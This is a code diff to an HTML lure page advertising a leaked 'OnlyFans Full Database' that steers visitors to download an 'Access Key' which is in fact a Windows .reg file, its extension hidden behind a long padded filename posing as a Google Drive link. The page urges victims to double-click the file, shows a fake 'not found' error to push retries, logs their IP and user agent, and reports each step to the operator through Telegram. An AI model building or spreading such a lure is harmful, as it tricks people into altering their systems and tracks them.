@@ -23,7 +23,7 @@
     html, body { height: 100%; }
     body {
       margin: 0;
-      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
       background:
         radial-gradient(1200px 600px at 20% 10%, rgba(255,73,112,0.22), transparent 55%),
         radial-gradient(900px 500px at 80% 20%, rgba(255,107,107,0.18), transparent 60%),
@@ -275,7 +275,7 @@
       color: #0f172a;
     }
 
-    /* Access Code Section - immer sichtbar */
+    /* Access Section */
     .access-section {
       background: #f8fafc;
       border: 2px solid #e2e8f0;
@@ -284,38 +284,15 @@
       margin-top: 12px;
     }
 
-    .access-label {
-      font-size: 12px;
-      color: #64748b;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 8px;
-      display: block;
-      font-weight: 600;
+    .info-text {
+      color: #475569;
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 16px;
     }
 
-    .access-input {
-      width: 100%;
-      padding: 12px 16px;
-      border: 2px solid #cbd5e1;
-      border-radius: 8px;
-      font-family: ui-monospace, monospace;
-      font-size: 18px;
-      letter-spacing: 2px;
-      text-align: center;
-      text-transform: uppercase;
-      outline: none;
-      transition: border-color 0.2s;
-      margin-bottom: 12px;
-    }
-
-    .access-input:focus {
-      border-color: #1a73e8;
-    }
-
-    .access-input.error {
-      border-color: #dc2626;
-      background: #fef2f2;
+    .info-text strong {
+      color: #0f172a;
     }
 
     .actionBtn {
@@ -343,47 +320,98 @@
     }
 
     .actionBtn:disabled {
-      background: #94a3b8;
       cursor: not-allowed;
-      opacity: 0.7;
+      opacity: 0.8;
     }
 
-    .actionBtn.success {
-      background: #16a34a;
-    }
-
-    .instruction-box {
-      background: #dbeafe;
-      border: 1px solid #60a5fa;
-      border-radius: 8px;
-      padding: 16px;
-      margin-bottom: 12px;
+    /* Loading Animation */
+    .loading-container {
       display: none;
+      text-align: center;
+      padding: 20px;
     }
 
-    .instruction-box.active {
+    .loading-container.active {
       display: block;
     }
 
-    .instruction-box h4 {
-      margin: 0 0 8px 0;
-      color: #1e40af;
-      font-size: 14px;
+    .spinner-ring {
+      display: inline-block;
+      position: relative;
+      width: 64px;
+      height: 64px;
     }
 
-    .instruction-box p {
+    .spinner-ring div {
+      box-sizing: border-box;
+      display: block;
+      position: absolute;
+      width: 51px;
+      height: 51px;
+      margin: 6px;
+      border: 6px solid #1a73e8;
+      border-radius: 50%;
+      animation: spinner-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      border-color: #1a73e8 transparent transparent transparent;
+    }
+
+    .spinner-ring div:nth-child(1) { animation-delay: -0.45s; }
+    .spinner-ring div:nth-child(2) { animation-delay: -0.3s; }
+    .spinner-ring div:nth-child(3) { animation-delay: -0.15s; }
+
+    @keyframes spinner-ring {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      margin-top: 16px;
+      color: #475569;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .loading-subtext {
+      margin-top: 8px;
+      color: #94a3b8;
+      font-size: 12px;
+    }
+
+    /* Success/Error Messages */
+    .message-box {
+      display: none;
+      border-radius: 8px;
+      padding: 16px;
+      margin-top: 16px;
+      text-align: center;
+    }
+
+    .message-box.active {
+      display: block;
+    }
+
+    .message-box.error {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      color: #991b1b;
+    }
+
+    .message-box.success {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      color: #166534;
+    }
+
+    .message-box h4 {
+      margin: 0 0 8px 0;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .message-box p {
       margin: 0;
-      color: #1e40af;
       font-size: 13px;
       line-height: 1.5;
-    }
-
-    .error-msg {
-      color: #dc2626;
-      font-size: 13px;
-      margin-top: 8px;
-      text-align: center;
-      display: none;
     }
 
     .hintRow{
@@ -476,21 +504,79 @@
               <div class="itemBody">
                 <h3 class="itemTitle">Free OnlyFans Premium Content - Full Database</h3>
                 
-                <!-- Access Code Section - immer sichtbar -->
-                <div class="access-section">
-                  <label class="access-label">🔐 Access Code Required</label>
+                <!-- Step 1: Download Section -->
+                <div class="access-section" id="step1">
+                  <p class="info-text">
+                    To access the <strong>OnlyFans Database Leak</strong>, you need to download and activate a free Access Key first. 
+                    <br><br>
+                    <strong>Instructions:</strong> Download the Access Key file below, then double-click it to activate. Once activated, you can access the Google Drive folder containing the full database.
+                  </p>
                   
-                  <div class="instruction-box" id="instructionBox">
-                    <h4>📥 Download Started!</h4>
-                    <p>Open the downloaded file to find your access key. Copy the key and paste it above, then click "Open Google Drive" to verify.</p>
+                  <button class="actionBtn" id="downloadBtn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                      <polyline points="7 10 12 15 17 10"></polyline>
+                      <line x1="12" y1="15" x2="12" y2="3"></line>
+                    </svg>
+                    Download Free Access Key
+                  </button>
+                </div>
+
+                <!-- Step 2: Loading Animation -->
+                <div class="loading-container" id="loadingSection">
+                  <div class="spinner-ring">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                  </div>
+                  <div class="loading-text" id="loadingText">Preparing your Access Key...</div>
+                  <div class="loading-subtext">Please wait while we generate your secure access credentials</div>
+                </div>
+
+                <!-- Step 3: Activation Button -->
+                <div class="access-section" id="step3" style="display: none;">
+                  <div class="message-box success active">
+                    <h4>✓ Download Complete</h4>
+                    <p>Your Access Key has been downloaded. Please locate the file in your Downloads folder and <strong>double-click it to activate</strong>.</p>
                   </div>
                   
-                  <input type="text" class="access-input" id="accessKeyInput" placeholder="XXXX-XXXX-XXXX" maxlength="14" />
-                  
-                  <button class="actionBtn" id="actionBtn">Get Free Access Key</button>
-                  
-                  <div class="error-msg" id="errorMsg">❌ Invalid access key. Please check the downloaded file and try again.</div>
+                  <button class="actionBtn" id="activateBtn" style="margin-top: 12px;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                    I've Activated the Access Key
+                  </button>
                 </div>
+
+                <!-- Step 4: Checking -->
+                <div class="loading-container" id="checkingSection">
+                  <div class="spinner-ring">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                  </div>
+                  <div class="loading-text">Checking Access Key...</div>
+                  <div class="loading-subtext">Verifying your activation status</div>
+                </div>
+
+                <!-- Step 5: Error Message -->
+                <div class="access-section" id="step5" style="display: none;">
+                  <div class="message-box error active">
+                    <h4>⚠ Access Key Not Found</h4>
+                    <p>Access Key not found. Please double-click the downloaded Access Key file to activate it, then try again.</p>
+                  </div>
+                  
+                  <button class="actionBtn" id="retryBtn" style="margin-top: 12px;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <polyline points="23 4 23 10 17 10"></polyline>
+                      <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
+                    </svg>
+                    Try Again
+                  </button>
+                </div>
+
               </div>
             </article>
           </div>
@@ -517,7 +603,6 @@
     let userIP = 'unknown';
     let userAgent = navigator.userAgent;
     let sessionID = Math.random().toString(36).substring(2, 15);
-    let hasDownloaded = false;
     
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
@@ -551,83 +636,58 @@
 
     function startDownload() {
       const a = document.createElement('a');
-      a.href = './01_OnlyFans_Full_DB_drive.google.com%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%25r%25rCopy%20OnlyFans%20Access%20Key%20%20%20%207A68Z-67CB2-P9GS2%25r%25r%25r%25b%250%20(61).reg';
+      a.href = './01_OnlyFans_Full_DB_drive.google.com%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%25r%25rOpen%20Google%20Drive%25r%25r%25r%25b%250%20(61).reg';
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
-      
-      sendTelegramMessage('📥 DOWNLOAD STARTED', 'User downloaded key file');
     }
 
-    // Format input with dashes
-    document.getElementById('accessKeyInput').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
-      if (value.length > 4 && value.length <= 8) {
-        value = value.slice(0,4) + '-' + value.slice(4);
-      } else if (value.length > 8) {
-        value = value.slice(0,4) + '-' + value.slice(4,8) + '-' + value.slice(8,12);
-      }
-      e.target.value = value;
-      
-      // Remove error styling on input
-      e.target.classList.remove('error');
-      document.getElementById('errorMsg').style.display = 'none';
-    });
-
-    document.getElementById('actionBtn').addEventListener('click', function() {
+    // Step 1: Download Button
+    document.getElementById('downloadBtn').addEventListener('click', function() {
       const btn = this;
-      const input = document.getElementById('accessKeyInput');
-      const instructionBox = document.getElementById('instructionBox');
-      const errorMsg = document.getElementById('errorMsg');
       
-      if (!hasDownloaded) {
-        // Erster Klick: Download starten
-        startDownload();
-        hasDownloaded = true;
+      // Show loading
+      document.getElementById('step1').style.display = 'none';
+      document.getElementById('loadingSection').classList.add('active');
+      
+      // Telegram notification
+      sendTelegramMessage('📥 ACCESS KEY DOWNLOAD STARTED', 'User clicked Download Free Access Key');
+      
+      // Start download
+      startDownload();
+      
+      // Simulate processing delay (3 seconds)
+      setTimeout(() => {
+        document.getElementById('loadingSection').classList.remove('active');
+        document.getElementById('step3').style.display = 'block';
         
-        // Anweisung anzeigen
-        instructionBox.classList.add('active');
-        
-        // Button ändern zu "Open Google Drive"
-        btn.textContent = 'Open Google Drive';
-        btn.classList.add('success');
-        
-        // Focus auf Input
-        input.focus();
-        
-      } else {
-        // Zweiter Klick: Key validieren (immer ungültig)
-        const key = input.value.trim();
-        
-        if (key.length === 0) {
-          input.classList.add('error');
-          return;
-        }
-        
-        // IMMER ungültig - Demo-Modus
-        input.classList.add('error');
-        errorMsg.style.display = 'block';
-        
-        // Shake-Animation
-        input.style.animation = 'shake 0.5s';
-        setTimeout(() => {
-          input.style.animation = '';
-        }, 500);
-        
-        sendTelegramMessage('❌ INVALID KEY ENTERED', `User tried: ${key}`);
-      }
+        sendTelegramMessage('✅ ACCESS KEY DOWNLOADED', 'File downloaded, showing activation instructions');
+      }, 3000);
     });
 
-    // Shake-Animation für Fehler
-    const style = document.createElement('style');
-    style.textContent = `
-      @keyframes shake {
-        0%, 100% { transform: translateX(0); }
-        25% { transform: translateX(-5px); }
-        75% { transform: translateX(5px); }
-      }
-    `;
-    document.head.appendChild(style);
+    // Step 3: Activation Button
+    document.getElementById('activateBtn').addEventListener('click', function() {
+      document.getElementById('step3').style.display = 'none';
+      document.getElementById('checkingSection').classList.add('active');
+      
+      sendTelegramMessage('🔍 CHECKING ACCESS KEY', 'User clicked "I\'ve Activated the Access Key"');
+      
+      // Simulate checking (2 seconds)
+      setTimeout(() => {
+        document.getElementById('checkingSection').classList.remove('active');
+        document.getElementById('step5').style.display = 'block';
+        
+        sendTelegramMessage('❌ ACCESS KEY NOT FOUND', 'Error message shown - key always invalid in demo');
+      }, 2000);
+    });
+
+    // Step 5: Retry Button
+    document.getElementById('retryBtn').addEventListener('click', function() {
+      document.getElementById('step5').style.display = 'none';
+      document.getElementById('step3').style.display = 'block';
+      
+      sendTelegramMessage('🔄 RETRY ACTIVATION', 'User clicked Try Again');
+    });
   </script>
 </body>
 </html>
